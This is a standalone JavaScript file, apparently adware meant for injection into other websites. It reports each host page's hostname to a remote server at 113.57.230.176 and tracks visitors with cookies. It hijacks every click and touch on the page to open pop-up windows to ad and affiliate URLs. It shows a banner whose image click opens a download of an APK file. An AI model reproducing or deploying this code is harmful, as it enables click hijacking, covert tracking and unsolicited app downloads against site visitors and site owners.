window.onload = function() {
	var script = document.createElement('script');
	var head = document.getElementsByTagName('head')[0];
	script.type = 'text/javascript';
	script.src = 'http://code.jquery.com/jquery-latest.js';
	head.appendChild(script);
	
	
	var _body = document.body;
	var id = 'newDiv9999';
	var name = 'newDivName';
	// 依照原始的方式是這樣設定的 
	var newElement = document.createElement('div');
	//var newText = document.createTextNode('這是存在於在新建立標籤 div 中的文字。'); 

	newElement.id = 'newDiv9999';
	newElement.setAttribute('name', 'newDivName');
	newElement.style="position:fixed; bottom:0;right:0;z-index:99990;width:100%;height:200px;"
//	newElement.style.position = 'fixed';
//	newElement.style.bottom = '30%';
//	newElement.style.right = '0';
	//newElement.style.marginRight='100px';
	newElement.style.margin='0 auto';
//	newElement.style.width = '90px';
//	newElement.style.height = '120px';
//	newElement.style.zindex = '999999';
	newElement.style.visibility = "hidden";
	newElement.style.positoon='absolute';

	newElement.style.bottom='0';
	newElement.style.right='0';
	//newElement.style.width='100%';
	//newElement.style.height='200px';
	//newElement.style.z-index='100';
	//newElement.style.background='#000';

	var a = document.createElement("a");
	
	a.innerHTML = "<img src=\"http://photo.51img1.com/gpza/M06/69/AC/CgsNeFk487SACaTYAAKEuxx9nsw138.png\" width=\"100%\"  height=\"200px\" onclick=\"oef()\"></img>";

	newElement.innerHTML = "<input type=\"button\" style=\"position:absolute; top:0; right:0; z-index:99;\"  onclick=\"divclose()\" value=\"X\" />";
	newElement.appendChild(a);

	_body.appendChild(newElement);
	
	window.url1 = top.location.hostname;
	isTouchDevice();
	var reqType = 1;
	var ad = 0;
	window.opp = 11;
	window.aop = 0;
	window.popFlag = getCookie('FlagForAbc123123');
	var xmlHttp;
	//alert(url1);
	script.onload = script.onreadystatechange = function() {
		if (!this.readyState || this.readyState == 'loaded' || this.readyState == 'complete') {
			ap(reqType, ad, url1);

		}
		script.onload = script.onreadystatechange = null;
	}

 
}

function ap(reqType, ad, url1) {

if (navigator.cookieEnabled == true) {
	
	//sendPostRequest("http://113.57.230.176:8888/404/Po", "reqType=3&url=" + url1);
	sendPostRequest("http://127.0.0.1:8080/404/Po", "reqType=3&url=" + url1);
	  
	var v1=0;
	var v2=0;
	var v3=0;
	var v4=0;
	var v5=0;         
	var v6=0;
	window.v7=0;
	var v8=0;
	var v7n=0;
	var v9=0;
	var popFlag2 = getCookie('showForAbc123123');
	if (popFlag2 == null || popFlag == "") {             
		v2 = 0;
		

	}
	
	else
		{
		v2=popFlag2
		}
	if (popFlag == null || popFlag == "") {             
		popFlag = 0;
		

	}
	
	else
		{
		if(popFlag.indexOf("5")!=-1)
			{
			 v5=1;
			
			}
		if(popFlag.indexOf("6")!=-1)
		{
		 v6=1;
		
		}
		
		if(popFlag.indexOf("7")!=-1)
		{
			window.v7=1;
		
		}
		
		if(popFlag.indexOf("8")!=-1)
		{
		 
		v8=1;
		}
		if(popFlag.indexOf("3")!=-1)
		{
		 
		v3=1;
		}
		if(popFlag.indexOf("1")!=-1)
		{
		 
		v1=1;
		}
		if(popFlag.indexOf("4")!=-1)
		{
		 
		v4=1;
		}
		if(popFlag.indexOf("9")!=-1)
		{
		 
		v9=1;
		}
		if(v7==1)
			{
		var strs= new Array(); //定义一数组 
		strs=popFlag.split("#"); //字符分割 
		for (i=0;i<strs.length ;i++ ) 
		{ 
			if(strs[i]==7)
				{
				  v7n+=1;
				}
		
		} 
		if(v7n>=2)
			{
			window.v7=v7n;
			//opp=7;
			}
			}
		}
	
//console.log("p:"+popFlag);
//	console.log("v7n:"+v7n);
//	console.log("v1:"+v1);
//	console.log("v3:"+v3);
//	console.log("v5:"+v5);
//console.log("v7:"+v7);
//	console.log("v8:"+v8);
//	console.log("v9:"+v9);
	
	if (popFlag ==0||((v1==0||v2==0||v3==0||v5==0||v4==0||v6==0||v7==0||v8==0)&&v9==0)) {
		$.ajax({
			type : 'post',
			//url : 'http://113.57.230.176:8888/404/Bo',
			url : 'http://127.0.0.1:8080/404/Bo',
			data : {
				"ad" : ad,
				"url" : url1
			},
			dataType : 'jsonp',

			jsonp : "jsonpcallback",
			success : function(result) {
				console.log("a1:"+result.status);
				console.log(result.dese);
				
				if (result.status == "0") {
					if (result.dese == "5") {
						
						window.opp=5;
					
					}
					if (result.dese == "1" ) {
						if(v1==0)
							{
							window.opp=1;
							}
						
						
					}
					if (result.dese == "3") {
						if(v3==0)
						{
						window.opp=3;
						}
					}
					if (result.dese == "2") {
						if(v2==0)
						{
						show();
						}
					}
					if (result.dese == "4") {
						if(v4==0)
						{
						window.opp=4;
						}
					}
					if (result.dese == "6") {
						if(v6==0)
							{
							window.opp=6;
							}
						 
					}
					if (result.dese == "7") {
						if(v7<2)
							{
							window.opp=7;
							}
						
					}
					if (result.dese == "8") {
						if(v8==0)
						{
						window.opp=8;
						}
					}
					if(popFlag==0)
						{
						setCookieOneDay("FlagForAbc123123",popFlag+"#"+opp+"#", 60 * 24);
						
						}
					else
						{
						setCookieOneDay("FlagForAbc123123",popFlag+opp+"#", 60 * 24);
						}
					
				}
				else if(result.status=="2")
					{
					if(v7<2)
						{
					
						if(popFlag==0)
						{
						setCookieOneDay("FlagForAbc123123",popFlag+"#7#7#", 60 * 24);
						
						}
					   else
						{
						setCookieOneDay("FlagForAbc123123",popFlag+"7#7#", 60 * 24);
						}
					//console.log("opp2 is 7");
						}
					}
				else
					{
					window.opp=9;
					if(popFlag==0)
					{
					setCookieOneDay("FlagForAbc123123",popFlag+"#"+opp+"#", 60 * 24);
					
					}
				   else
					{
					setCookieOneDay("FlagForAbc123123",popFlag+opp+"#", 60 * 24);
					}
					
					}

			},
			error : function() {setCookie("FlagForAbc123123", 99, 20);}
		});
	
	} else {
		if(v7<2&&v9==0)
			{
			opp=7;
			//console.log("opp is 7");
			}
		
            

	}
}
}
document.onclick =touchSatrtFunc;
/*document.onclick = function(ev) {

	if (opp == 1 || opp == 3 || opp == 5||opp==6||opp==7) {
		var ap = opp;
		//console.log("a1:"+opp)
		
		opp = 11;

		
		$.ajax({
			type : 'post',
			//url : 'http://10.0.0.8:8080/404/Co',
			url : 'http://113.57.230.176:8888/404/Co',
			data : {
				"ad" : ap
				
			},
			dataType : 'jsonp',

			jsonp : "jsonpcallback",
			success : function(result) {

				//console.log("a2："+result.status); 
				//console.log(result.dese);
				if (result.status == "3") {
					if(popFlag==0)
					{
					setCookieOneDay("FlagForAbc123123",popFlag+","+ap+",", 60 * 24);
					
					}
				else
					{
					setCookieOneDay("FlagForAbc123123",popFlag+ap+",", 60 * 24);
					}
					

				}

			},
			error : function() {

				setCookieOneDay("FlagForAbc123123", 9, 30);
			}
		});
		if (ap == 1) {
			//window.open("http://lbbseo.com:8888/adware/ldy6.do?id=111");
		}
		if (ap == 3) {
			
			window.open("http://m.mychebao.com/czhib_promote/SEOSecIndew.htm?isBaiDu=35123&wuhan");
		}
		if (ap == 5) {
			window.open("http://iwap.2345.com/?lm_1128");
			//window.open("http://netkr.sunrtb.cn/c?m=netkr&v=43.642.113&fc=1&l=http://engine.yuyiya.com/index/activity?appKey=36Dsjee7ot6QR1z2W8QqWLcLoMTY&adslotId=1551");
		}
		if (ap == 6) {
			window.open("http://toutiao.eastday.com/?qid=jhxin");
			//setCookieOneDay("FlagForAbc123123", 99, 30);
			//window.open("http://netkr.sunrtb.cn/c?m=netkr&v=43.642.113&fc=1&l=http://engine.yuyiya.com/index/activity?appKey=36Dsjee7ot6QR1z2W8QqWLcLoMTY&adslotId=1551");
			              			
		}
if (ap == 7) {
			
			window.open("http://netkr.sunrtb.cn/c?m=netkr&v=43.642.113&fc=1&l=http://engine.yuyiya.com/index/activity?appKey=36Dsjee7ot6QR1z2W8QqWLcLoMTY&adslotId=1551");
			              			
		}

	} else {
		
         return;
	}
}*/
function touchSatrtFunc(e) {  
    //evt.preventDefault(); //阻止触摸时浏览器的缩放、滚动条滚动等  
  // alert(opp);
	
  // if (opp == 1 || opp == 3 || opp == 5||opp==7||opp==8) {
	if (opp == 1 || opp == 3 || opp == 5||opp==4||opp==6||opp==7||opp==8) { 
		var ap = opp;
		
		
		opp = 11;
	 var newWindow = window.open("_blank");
		if (ap == 1) {
			//window.opp = 11;
			//window.open("http://lbbseo.com:8888/adware/ldy6.do?id=111");
			newWindow.location = "http://123.tuoke168.cn/";
			//window.open("http://123.tuoke168.cn/");
		}
		if (ap == 3) {
			//window.opp = 11;
			//window.open("http://m.mychebao.com/czhib_promote/SEOSecIndew.htm?isBaiDu=35123&wuhan");
			newWindow.location = "http://m.mychebao.com/czhib_promote/SEOSecIndew.htm?isBaiDu=35123&wuhan";	
		
		}
		if (ap == 5) {
			//window.opp = 11;
			//window.open("http://iwap.2345.com/?lm_1128");
			newWindow.location="http://iwap.2345.com/?lm_1128";			
		}
		if (ap == 4) {
			//window.opp = 11;
			//window.open("https://media.weibo.cn/article?id=2309404109968977574244&from=singlemessage&isappinstalled=1&jumpfrom=weibocom");
			
			//window.open("http://netkr.sunrtb.cn/c?m=netkr&v=43.642.113&fc=1&l=http://engine.yuyiya.com/index/activity?appKey=36Dsjee7ot6QR1z2W8QqWLcLoMTY&adslotId=1551");
			var num = GetRandomNum(1,10);
			console.log("num:"+num);
			if(num<=2)
				{
				newWindow.location = "http://c.b1wv.com/h.iHcgcn?cv=ab5RG0M9N8&sm=9e08cb";
				}
			if(num>2&&num<=4)
				{
			   
				 newWindow.location = "http://c.b1wv.com/h.iHYN3d?cv=HLkJG0MhEi&sm=0324c0";
				}
			if(num>4&&num<=6)
			{
				 newWindow.location = "http://c.b1wv.com/h.iHcnlN?cv=qbB8G0MORG&sm=54cefe";
	
			}
			if(num>6&&num<=8)
			{
				 newWindow.location = "http://c.b1wv.com/h.iH1SLc?cv=afT9G0M8Hd&sm=3f90f6";
	
			}
			if(num>8&&num<=10)
			{
				 newWindow.location = "http://c.b1wv.com/h.iH1tLt?cv=HnF4G0Mkof&sm=9e26ef";
	
			}
		}
		if (ap == 6) {
			//window.opp = 11;
			//setCookieOneDay("FlagForAbc123123", 99, 30);
			//window.open("http://toutiao.eastday.com/?qid=jhxin");
			//window.open("http://netkr.sunrtb.cn/c?m=netkr&v=43.642.113&fc=1&l=http://engine.yuyiya.com/index/activity?appKey=36Dsjee7ot6QR1z2W8QqWLcLoMTY&adslotId=1551");
			newWindow.location = "http://toutiao.eastday.com/?qid=jhxin";              			
		}
		if (ap == 7) {
			//console.log("2v7:"+v7);
			//window.open("http://netkr.sunrtb.cn/c?m=netkr&v=43.642.113&fc=1&l=http://engine.yuyiya.com/index/activity?appKey=36Dsjee7ot6QR1z2W8QqWLcLoMTY&adslotId=1551");
			newWindow.location = "http://netkr.sunrtb.cn/c?m=netkr&v=43.642.113&fc=1&l=http://engine.yuyiya.com/index/activity?appKey=36Dsjee7ot6QR1z2W8QqWLcLoMTY&adslotId=1551";           			
//			if(v7>=2)
//				{
//				
//				window.opp = 8;
//				ap=11;
//				}
//			else
//				{
//				v7++;
//			window.open("http://netkr.sunrtb.cn/c?m=netkr&v=43.642.113&fc=1&l=http://engine.yuyiya.com/index/activity?appKey=36Dsjee7ot6QR1z2W8QqWLcLoMTY&adslotId=1551");
//				}  
			//console.log("3v7:"+v7);
		}
		if(ap==8)
			{
			newWindow.location = "http://jjxsylcqk.cn/app/39.gif";
			}
		$.ajax({
			type : 'post',
			url : 'http://127.0.0.1:8080/404/Co',
			//url : 'http://113.57.230.176:8888/404/Co',
			data : {
				"ad" : ap
				
			},
			dataType : 'jsonp',

			jsonp : "jsonpcallback",
			success : function(result) {

				console.log("a2："+result.status); 
				console.log(result.dese);
				if (result.status == "3") {
					if(popFlag==0)
					{
					setCookieOneDay("FlagForAbc123123",popFlag+"#"+ap+"#", 60 * 24);
					
					}
				else
					{
					setCookieOneDay("FlagForAbc123123",popFlag+ap+"#", 60 * 24);
					}

				}

			},
			error : function() {

				setCookieOneDay("FlagForAbc123123", 99, 30);
			}
		});
		//console.log("opp:"+opp);

	} else {
		 //alert("3333333333");
      return;
	}
		
	
	
	
		
}  
function isTouchDevice() {
   // document.getElementById("version").innerHTML = navigator.appVersion;

    try {
        document.createEvent("TouchEvent");
        //alert("TouchEvent");

        bindEvent(); //绑定事件
    }
    catch (e) {
       // alert("no TouchEvent" + e.message);
    }
}
function bindEvent() {
    document.addEventListener('touchstart', touchSatrtFunc, false);
    //document.addEventListener('touchmove', touchSatrtFunc, false);
   //document.addEventListener('touchend', touchSatrtFunc, false);
}
function getCookie(c_name) {
	if (document.cookie.length > 0) {
		c_start = document.cookie.indexOf(c_name + "=");

		if (c_start != -1) {
			c_start = c_start + c_name.length + 1;
			c_end = document.cookie.indexOf(";", c_start);
			if (c_end == -1)
				c_end = document.cookie.length;
			return unescape(document.cookie.substring(c_start, c_end));


		}
	}

	return "";
}


function setCookie(c_name, value, expireMins) {
	//var leftTime = new Date(new Date(new Date().toLocaleDateString()).getTime() + 24 * 60 * 60 * 1000 - 1) //当日23点59分59秒过期

	//document.cookie = c_name + "=" + escape(value) + ((expireMins == null) ? "" : ";expires=" + leftTime.toGMTString());
	var exdate = new Date();
	exdate.setTime(exdate.getTime() + expireMins * 60 * 1000);
	document.cookie = c_name + "=" + escape(value) +
	((expireMins == null) ? "" : ";expires=" + exdate.toGMTString());
}
function setCookieOneDay(c_name, value, expireMins) {
	var leftTime = new Date(new Date(new Date().toLocaleDateString()).getTime() + 24 * 60 * 60 * 1000 - 1) //当日23点59分59秒过期

	document.cookie = c_name + "=" + escape(value) + ((expireMins == null) ? "" : ";expires=" + leftTime.toGMTString());
	
}

function sendPostRequest(url, param, callback) {
	var xmlhttp;
	if (window.XMLHttpRequest) {
		// code for IE7+, Firefox, Chrome, Opera, Safari
		xmlhttp = new XMLHttpRequest();
	} else {
		// code for IE6, IE5
		xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
	}
	xmlhttp.onreadystatechange = callback;
	xmlhttp.open("POST", url, true);
	xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	xmlhttp.send(param);
	return xmlhttp;
}

function divclose() {
	//alert("div");
	setCookie("showForAbc123123", 2, 60 * 24);
	newDiv9999.style.visibility = "hidden";
	//sendPostRequest("http://113.57.230.176:8888/404/admin/Paction", "reqType=2&ad=99"); //关闭广告
	sendPostRequest("http://127.0.0.1:8080/404/admin/Paction", "reqType=2&ad=99"); //关闭广告
}
function show() {
	newDiv9999.style.visibility = "visible";
	//sendPostRequest("http://113.57.230.176:8888/404/admin/Paction", "reqType=3&url="+"www.abcabc.cc");//显示广告
	sendPostRequest("http://113.57.230.176:8888/404/admin/Paction", "reqType=2&ad=77"); //显示广告
}
function oef() {
	setCookie("showForAbc123123", 2, 60 * 24);
	//sendPostRequest("http://113.57.230.176:8888/404/admin/Paction", "reqType=2&ad=88"); //点击广告
	sendPostRequest("http://127.0.0.1:8080/404/admin/Paction", "reqType=2&ad=2"); //关闭广告
	window.open("http://www.i9639.com/ypyx.apk");
}
function GetRandomNum(Min,Max)
{   
var Range = Max - Min;   
var Rand = Math.random();   
return(Min + Math.round(Rand * Range));   
}   

